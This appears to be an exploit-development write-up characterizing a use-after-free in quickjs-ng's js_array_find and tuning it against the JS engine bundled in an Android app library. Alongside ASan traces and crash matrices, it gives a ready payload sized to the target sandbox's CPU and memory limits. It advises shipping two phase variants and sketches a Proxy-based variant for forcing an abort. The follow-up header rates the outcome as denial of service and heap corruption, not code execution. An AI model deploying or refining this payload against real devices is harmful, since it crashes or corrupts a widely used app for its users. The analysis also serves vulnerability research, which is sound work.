# quickjs-ng `js_array_find` interrupt UAF — offline characterization

> **Follow-up (2026-11-01 14:27):** the app verdict is **DoS/teardown only**,
> not RCE. Device M1 confirmed `runScripts` breaks after `die()` and no
> post-interrupt script runs. Later lab work also refined the arena mechanism:
> it is a premature free/over-decrement plus a bogus second arena free, not a
> plain double push (see `arena_type_confusion_notes.md`). The ASan/UAF data
> below remains valid.

Target: `js_array_find` in quickjs-ng v0.17.0 (upstream issue #1792), same
structure as `libtmessages.49.so` @ `0x17955A8`.
Everything below is local, x86-64, no phone.

## 1. Environment

Source: `/tmp/opencode/qjs017` (v0.17.0). Builds used:

| build | flags | purpose |
|---|---|---|
| `uaf_asan` / `single_asan` | `-O1 -g -fsanitize=address` (fresh compile of `quickjs.c`) | UAF detection |
| `single_inst_asan` | ASan + fprintf instrumentation in `js_array_find` | fire site + iteration count |
| `uaf_inst` / `single_inst` | `-O1 -g`, asserts on, arena on | ground truth (POLL vs CALL) |
| `uaf_rel` / `single_rel` | `-O3 -DNDEBUG` (`build_rel`) | production-like |
| `uaf_dbg` | `-O0 -g` asserts (`build_dbg`) | assertion cross-check |

> `qjs017/build2/libqjs.a` is **stale** and does *not* reproduce the UAF
> (it misses the arena/header layout of the current source). A fresh ASan
> compile of `quickjs.c` does. Do not trust `build2/` results.

Harness sources (all in `/tmp/opencode`):

* `uaf_matrix.c` — element-type × N × policy matrix; policies `poll`,
  `deadline` (CLOCK_MONOTONIC) and **`cpu` (CLOCK_THREAD_CPUTIME_ID, ms)**;
  `MEMLIMIT=<bytes>` maps to `JS_SetMemoryLimit`; prints
  `JSMemoryUsage.malloc_size`; `NUDGE=n` adds n one-poll JS calls (`nop()`)
  before the find; `INLINE=1` uses a temporary receiver.
* `single_payload.c` — app-shaped single eval:
  `Array.prototype.find.call('A'.repeat(N), CB);` under a CPU-time deadline,
  optional `MEMLIMIT`, post-interrupt churn model (`CHURN2/3/4`, `NOSFREE`).
* `pollprobe.c` — exact interrupt-poll accounting.

Builds:

```sh
gcc -O1 -g -fsanitize=address -fno-omit-frame-pointer -I qjs017 \
    single_payload.c quickjs_inst.c qjs017/libregexp.c qjs017/libunicode.c \
    qjs017/dtoa.c -lm -lpthread -o single_inst_asan
gcc -O2 -I qjs017 single_payload.c qjs017/build_rel/libqjs.a -lm -lpthread -o single_rel
```

## 2. Trigger mechanics (measured)

`js_array_find` (`quickjs.c:43971`) polls at the **top of each iteration** and
frees `val`/`index_val` at the bottom. On the interrupt path it frees both
again, but they are stale (`val` is the *previous* element, already freed):

```
for (; k != end; k += dir) {
    if (js_poll_interrupts(ctx)) goto exception;   /* <-- only vulnerable site */
    index_val = js_int64(k);
    val = JS_GetPropertyValue(ctx, obj, index_val);
    ...
    JS_FreeValue(ctx, val);        /* freed here */
    JS_FreeValue(ctx, index_val);
}
exception:
    JS_FreeValue(ctx, index_val);  /* double free if the poll fired above */
    JS_FreeValue(ctx, val);
```

Poll accounting (`pollprobe`, exact):

* `js_poll_interrupts` calls the handler only every
  `JS_INTERRUPT_COUNTER_INIT = 10000` polls, then resets the counter to 10000.
* A `find` on a string/array costs exactly **2 polls per iteration**:
  loop-top poll + `JS_CallInternal` entry poll (the predicate call).
* One extra trivial JS call (`nop()`) shifts the phase by exactly 1 poll and
  flips the fire site between *loop top* (UAF) and *call entry* (safe).

Instrumented proof (`uaf_inst`):

```
NUDGE=0  -> [inst] CALL exc at k=74997       (safe: val still live)
NUDGE=1  -> [inst] POLL fire at k=74997      (stale val, ASan UAF)
```

`str` in `uaf_inst` reports `valtag=-7` (JS_TAG_STRING), i.e. the freed 1-char
`JSString`. ASan stack for the stale free:

```
#0 js_array_find  quickjs.c:44052   (JS_FreeValue(ctx, val) in exception:)
#8 js_array_find  quickjs.c:44041
```

Two engine properties matter for exploitation:

1. `JS_ThrowInterrupted()` calls `JS_SetUncatchableError()` — `try/catch`
   **cannot** catch the interrupt. One shot per script evaluation.
2. The counter is reset to 10000 at the moment the handler fires, so the
   outcome is *deterministic for a given engine build + script*, not random.

## 3. 300 ms CPU budget (new sandbox constraints)

Model implemented: per-thread CPU clock (`CLOCK_THREAD_CPUTIME_ID`), handler
returns 1 when `cpu >= budget`, `JS_SetMemoryLimit(6 MiB)`, single eval.

### 3.1 Exact payload `'A'.repeat(N)` + `find.call(s, Number)`

Single eval, `cpu=300 ms`, `memlimit=6291456`, ASan -O0 build
(`single_inst_asan <N> 300 6291456 number`):

| N | eval CPU ms | fired in find | iterations at interrupt | ASan |
|---|---|---|---|---|
| 150 000 | 108 | no | — | — |
| 200 000 | 141 | no | — | — |
| 250 000 | 175 | no | — | — |
| 300 000 | 213 | no | — | — |
| 400 000 | 276 | no | — | — |
| **500 000** | **~300** | **yes (POLL)** | **419 998** | **heap-use-after-free** |
| 1 000 000 | ~300 | yes (POLL) | 434 998 | heap-use-after-free |
| **2 000 000** | **~300** | **yes (POLL)** | **~420 000** (419 998–424 998) | **heap-use-after-free** |

`N=2 000 000`, `cb=js` (`if (i&1) nop(); return false;`): fire at
**k = 322 856**, same UAF. All UAFs are at `js_array_find:44052`, the
exception-path free of the stale 1-char string.

So on this (slow, ASan -O0) build the **minimum string is ~450–500 k chars**;
the interrupt lands after **~420 k iterations** of `find`.

### 3.2 Does the 2 M string fit the 6 MiB heap cap?

Yes. `JS_ComputeMemoryUsage` while `'A'.repeat(2 000 000)` is resident
(measured right after the set-up eval; the single-eval temporary has the same
peak during the loop):

```
malloc_size = 2 105 220   (str_size = 2 000 041)   limit = 6 291 456
```

i.e. **33 % of the 6 MiB cap**, ~4.2 MB headroom. With `MEMLIMIT=6 MiB` the
UAF is identical (ASan, nudge/phase unchanged). Measured bounds:

* 5 800 000 chars: `malloc_size = 5 905 220` — still fits.
* 6 200 000 chars: `InternalError: out of memory` (allocation fails before
  `find`), i.e. the practical maximum is ~6.0–6.1 M chars.

### 3.3 Iteration-rate budget (iterations per ms of CPU)

| build | rate | iterations in 300 ms |
|---|---|---|
| ASan -O0 (this box) | ~1.4 k/ms | ~420 k (measured fire) |
| -O1 asserts (`single_inst`) | ~14–15 k/ms | ~4.4 M (5 M string fired at k=4 414 998) |
| -O3 release (`single_rel`) | ~22–23 k/ms | ~6.8 M |
| expected handset (given 0.5–1.2 M / 300 ms) | 1.7–4 k/ms | 0.5–1.2 M |

Consequences:

* On the handset, a 2 M-char string is still running at 300 ms with a
  **1.7–4× margin**; the interrupt should land at ~0.5–1.2 M iterations.
  Minimum reliable string at the expected worst case is therefore
  **~1.2 M chars** (iterations = rate × 300 ms); 2 M is the recommended
  small-and-safe size.
* Break-even for N=2 M is **6.7 k iterations/ms**. A device faster than that
  finishes the loop before the budget expires (on this x86 -O3 box the 2 M
  loop takes ~87 ms and the 5 M loop ~222 ms, so nothing fires at 300 ms).
* If margin is wanted for faster devices, **N = 4 000 000** still fits
  (4.1 MB of 6 MiB) and pushes break-even to ~13 k it/ms. Larger than
  ~6.0 M is not possible under the cap.
* Cheapest set-up: the string itself costs ~5 ms per 2 M chars; `distinct`
  object arrays are impossible under the cap (a JSObject+slot ≈ 96 B →
  ≈ 65 k objects max, ~20 ms of loop, far short of 300 ms).

### 3.4 Phase caveat (important)

The fire site depends on the poll phase at loop entry, which is fixed by the
engine build and the exact script prefix. In the **single-eval app-shaped**
payload above the phase lands on the **loop top** (UAF) in our build, but in
the older two-eval harness (`setup` evaluated, then deadline armed, then
`find`) the same `Number` payload lands on the call-entry poll and is safe.
A single extra call in the script flips it. Since the interrupt is
uncatchable there is no in-script retry: verify the phase on-device, or ship
two variants (one extra `nop()` before the `find`).

## 4. Without ASan (release + glibc checks)

### 4.1 The app library uses quickjs's small-block arena

`lib/arm64-v8a/libtmessages.49.so` from
`Android_Beta_13.2.0_(72789).apk` contains the v0.17 arena size-class table
`{16,24,32,…,512}` at vaddr/file offset **0x410236**, and **96**
`adrp …; add #0x236` references to it. So allocations ≤ 512 B (including
1-char JSStrings and JSObjects) come from the **JS arena**, not from
bionic/scudo.

Consequence for this bug: the double free of a 1-char `JSString` is a
push of an already-free block onto the arena free list (a double push), not a
system `free()`. Scudo never sees it, so there is **no immediate allocator
abort on-device**; the damage is JS-heap free-list corruption.

### 4.2 Measured release behaviour

Same single-eval payload at a CPU budget this x86 box can actually reach
(`cpu=50 ms`, `find.call('A'.repeat(2_000_000), Number)`):

```
PAYLOAD N=2000000 cpu_ms=50 ... fired=1 calls=~210 fire_cpu_ms=50.1
         is_exc=1 exc="InternalError: interrupted"
```

then, when the runtime is destroyed:

* **3/3 runs: SIGSEGV (exit 139)** inside
  `JS_FreeRuntime → JS_RunGC → free_gc_object → js_free_shape0`.
* `MALLOC_CHECK_=3`, `GLIBC_TUNABLES=glibc.malloc.tcache_count=0` and both:
  same SIGSEGV (the second free never reaches glibc, so glibc checks do not
  change the outcome).
* With a JS predicate the two-eval harness (`str 200 000`, 5 ms deadline,
  `cb=js`) produced the glibc abort
  **`double free or corruption (out)`** in
  `JS_FreeRuntime → JS_RunGC → free_gc_object → __JS_FreeAtom → free`
  (an aliased 32-byte block reused as a `JSAtomStruct`, freed twice by GC).
  In the single-eval release run (`single_rel 2 000 000 50 0 js`) this was
  1/2 SIGSEGV, i.e. not deterministic.
* Debug build (`uaf_dbg`): `gc_decref_child: Assertion 'JS_REF_COUNT(p) > 0'`
  at teardown, and with `-O1` asserts on the stale string header is
  clobbered (`len=0x20202020`) → `JS_FreeAtomStruct: Assertion 'i != 0'`.

**Latency caveat (matches "die() does not free the context"):** with
`NOSFREE=1` (no `JS_FreeContext`/`JS_FreeRuntime`, i.e. the app model) and a
post-interrupt churn of 400 000 one-char strings, 200 `eval`-compiled
scripts and explicit GCs, the release build did **not** crash (exit 0, 3/3).
The corruption is real (ASan proves the UAF) but it is latent in the arena:
the same 32-byte block is handed out repeatedly, so 1-char strings/atoms
silently alias. It becomes a detectable crash when the engine is torn down,
or when the aliased block is later reused as a different structure and
freed by GC. On the handset (context never freed) treat this as **heap
corruption, not a guaranteed immediate abort**.

## 5. 1–20 ms deadline matrix (task 1, for the record)

`run_matrix.py` over 5 element types × N ∈ {50 k, 200 k, 500 k, 1 M, 2 M} ×
deadlines {1,2,5,10,20} ms × phase nudge {0,1} → `matrix_rel.csv`
(250 runs, 13.5 s) and `matrix_asan.csv` (250 runs, 109 s).

Summary (release, default glibc):

| etype | phase that fires | outcome per in-loop fire |
|---|---|---|
| `distinct` (array of `{i}`) | nudge 0 | 21/21 **SIGSEGV** (drop/array finalizer) |
| `shared` (array of one `{}`) | nudge 0 | 21/21 **SIGSEGV** (later, at teardown) |
| `str` (`'x'.repeat(N)`, char reads) | nudge 1 | 21/21 **SIGABRT**, glibc `double free or corruption (out)` |
| `big_shared` / `big_fill` (700 B strings) | nudge 1 (ASan UAF) | 0/25 crash — block > 512 B goes to glibc, whose metadata clobbers the in-band refcount, so the second `JS_FreeValue` is skipped |
| ASan (all types) | exactly one nudge | `heap-use-after-free` in 25/25 configs |

The other nudge is always clean (`post=ok`, exit 0): the fire is at the
`JS_Call` entry poll, where `val` is still live. `fired=0` cases are simply
loops shorter than the deadline (e.g. N=50 k at ≥5 ms).

## 6. Recommendation

Smallest payload that reaches the vulnerable free inside the 300 ms budget
and the 6 MiB cap:

```js
Array.prototype.find.call('A'.repeat(2000000), Number);
```

* **N = 2 000 000 chars** (1 line, ~60 bytes of source; the 2 MB is runtime
  memory, not HTML). Memory: 2.10 MB of the 6 MiB cap (33 %).
* Expected interrupt on a handset: **~0.5–1.2 M iterations**, i.e. inside
  the 2 M loop with 1.7–4× margin. Measured on a slow ASan -O0 build:
  fire at **k ≈ 420 000** (419 998–424 998 across runs), UAF at
  `js_array_find:44052`.
* If you want margin for faster devices, use **N = 4 000 000** (4.1 MB,
  still < 6 MiB): break-even rises to ~13 k iterations/ms.
* N > ~6.0 M is impossible: `InternalError: out of memory` at 6.2 M.

Expected effect on-device: the stale free pushes a 1-char `JSString` arena
block twice → free-list self-loop in that size class → later aliasing of
1-char strings/atoms and GC-time double free. It is **not** an immediate
scudo abort (small blocks never reach scudo), and it is **not** deterministic
within the harness window if the context is never freed. If a hard abort is
required, the element value must be > 512 B (to bypass the arena) and a
fresh value per index is needed (e.g. a `Proxy` get trap returning
`'x'.repeat(700)`): on glibc the second free is usually skipped because the
in-band refcount is clobbered; on Android's out-of-band scudo metadata it
should reach `free()` and be caught, but that cannot be verified offline.

Phase: the vulnerable site is the loop-top poll. It is one-poll parity
sensitive; in the single-eval payload it hit the loop top in our build, but
verify on-device (or add one extra `nop()` before the `find` to flip it).

## 7. Files

* `uaf_matrix.c`, `single_payload.c`, `pollprobe.c`, `run_matrix.py`
* `matrix_rel.csv`, `matrix_asan.csv` (full 250-run matrices)
* `quickjs_inst.c` (instrumented copy of quickjs.c; prints fire site/k and
  big-string frees)
* `uaf_asan`, `uaf_rel`, `uaf_dbg`, `uaf_inst`, `single_asan`, `single_rel`,
  `single_inst`, `single_inst_asan`

Reproduce the 300 ms run:

```sh
cd /tmp/opencode
./single_inst_asan 2000000 300 6291456 number
# -> [inst] POLL fire at k=419998 ... ASan heap-use-after-free js_array_find:44052
./single_rel 2000000 50 0 number      # 3/3 SIGSEGV at JS_FreeRuntime (teardown)
NOSFREE=1 ./single_rel 2000000 50 0 number   # exit 0: corruption stays latent
```
